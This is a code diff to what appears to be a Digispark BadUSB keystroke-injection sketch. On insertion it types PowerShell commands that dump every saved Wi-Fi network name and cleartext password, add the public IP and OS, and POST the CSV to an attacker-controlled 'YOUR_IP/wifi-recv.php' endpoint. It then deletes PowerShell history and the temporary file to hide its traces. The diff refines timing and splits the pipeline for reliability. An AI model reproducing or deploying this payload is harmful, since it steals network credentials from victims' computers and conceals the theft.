@@ -1,5 +1,7 @@
 #include "DigiKeyboard.h"
 
+#define KEY_R 0x15
+
 void setup() {
   pinMode(1, OUTPUT);  // onboard LED
 }
@@ -13,74 +15,105 @@ void loop() {
   DigiKeyboard.delay(150);
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(600); // wait for PS window to be ready
+  DigiKeyboard.delay(700); // wait for PS window to be ready
 
-  // 1) $csvPath = "$env:TEMP\temp.csv"
-  DigiKeyboard.print(
-    F("$csvPath = \"$env:TEMP\\temp.csv\"")
-  );
+  // $csvPath = "$env:TEMP\temp.csv"
+  DigiKeyboard.print(F("$csvPath = \"$env:TEMP\\temp.csv\""));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(150);
 
-  // 1b) $ip and $os
+  // $ip
   DigiKeyboard.print(
     F("$ip = (Invoke-RestMethod -Uri \"https://api.ipify.org?format=json\").ip")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(500);
 
+  // $os
   DigiKeyboard.print(
     F("$os = (Get-CimInstance Win32_OperatingSystem).Caption")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(500);
 
-  // 2) (netsh wlan show profiles) | ... | Export-Csv $csvPath -NoTypeInformation
+  // $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | %{ $_.Line.Split(':')[1].Trim() }
   DigiKeyboard.print(
-    F("(netsh wlan show profiles) | "
-      "Select-String '\\:(.+)$' | "
-      "% { $name = $_.Matches.Groups[1].Value.Trim(); $_ } | "
-      "% { netsh wlan show profile name=$name key=clear } | "
-      "Select-String 'Key Content\\W+\\:(.+)$' | "
-      "% { $pass = $_.Matches.Groups[1].Value.Trim(); $_ } | "
-      "% { [PSCustomObject]@{ profile_name = $name; password = $pass; ip = $ip; os = $os } } | "
-      "Export-Csv $csvPath -NoTypeInformation")
+    F("$profiles = (netsh wlan show profiles) | Select-String \"All User Profile\" | ")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(3000); // allow netsh + Export-Csv to finish
+  DigiKeyboard.delay(250);
 
-  // 3) $b = Get-Content $csvPath -Raw
+  DigiKeyboard.print(
+    F("%{ $_.Line.Split(':')[1].Trim() }")
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(800);
+
+  // $wifi = foreach($p in $profiles) { ... }
+  DigiKeyboard.print(
+    F("$wifi = foreach($p in $profiles){")
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(250);
+
+  DigiKeyboard.print(
+    F("$dump = netsh wlan show profile name=\\\"$p\\\" key=clear;")
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(250);
+
+  DigiKeyboard.print(
+    F("$pass = $dump | Select-String \"Key Content\" | %{ $_.Line.Split(':')[1].Trim() };")
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(250);
+
+  DigiKeyboard.print(
+    F("[PSCustomObject]@{SSID=$p; Pass=$pass; IP=$ip; OS=$os} }")
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500); // allow netsh loop
+
+  // Export to CSV
+  DigiKeyboard.print(
+    F("$wifi | Export-Csv $csvPath -NoTypeInformation")
+  );
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(4000); // allow Export-Csv to finish
+
+  // $b = Get-Content $csvPath -Raw
   DigiKeyboard.print(
     F("$b = Get-Content $csvPath -Raw")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(500);
 
-  // 4) Invoke-WebRequest ... -Body $b
+  // Invoke-WebRequest to Kali (port 80)
   DigiKeyboard.print(
-    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP:8080/wifi-recv.php' -Method POST -Body $b")
+    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP/wifi-recv.php' -Method POST -Body $b")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1500); // allow HTTP + PHP
+  DigiKeyboard.delay(2000); // allow HTTP + PHP
 
-  // 5) del (Get-PSReadlineOption).HistorySavePath
+  // Clear PS history
   DigiKeyboard.print(
     F("del (Get-PSReadlineOption).HistorySavePath")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
 
-  // 6) Remove-Item $csvPath ... and exit
+  // Remove CSV
   DigiKeyboard.print(
     F("Remove-Item $csvPath -ErrorAction SilentlyContinue")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
 
+  // Exit PowerShell
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  // 7) Blink LED forever to signal completion
+  // Blink LED forever to signal completion
   while (true) {
     digitalWrite(1, HIGH);
     DigiKeyboard.delay(200);
